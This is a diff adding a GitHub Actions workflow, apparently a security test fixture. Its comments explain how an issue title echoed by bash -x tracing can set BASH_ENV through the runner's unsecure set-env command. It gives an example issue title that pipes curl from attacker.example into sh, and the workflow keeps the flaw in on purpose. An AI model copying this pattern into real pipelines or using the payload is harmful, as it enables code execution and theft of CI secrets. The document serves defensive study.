@@ -1,0 +1,27 @@
+# situation: on issues, a job sets ACTIONS_ALLOW_UNSECURE_COMMANDS to true
+#   in its env, and a step whose shell: is bash -x {0} passes the title of
+#   the issue to git log; a step comes after.
+# reason: bash -x starts the script with the trace on, as set -x does, so
+#   the trace prints the command with the title on the standard error,
+#   where the runner reads ##[set-env name=NAME;] anywhere in a line as a
+#   command where the flag is true; the title is the attacker's, and a
+#   set-env of BASH_ENV runs the attacker's code in the bash of the next
+#   step.
+# attack: the attacker opens an issue titled ##[set-env
+#   name=BASH_ENV;]$(curl -s https://attacker.example/x | sh).
+# attack-run-behavior: the trace prints the git log command with the title,
+#   the runner sets BASH_ENV, and the bash of the next step runs the
+#   attacker's script with the token and the secrets of the job.
+on: issues
+permissions: {}
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      ACTIONS_ALLOW_UNSECURE_COMMANDS: true
+    steps:
+      - shell: bash -x {0}
+        env:
+          TITLE: ${{ github.event.issue.title }}
+        run: git log --grep "$TITLE" > log.txt
+      - run: echo next
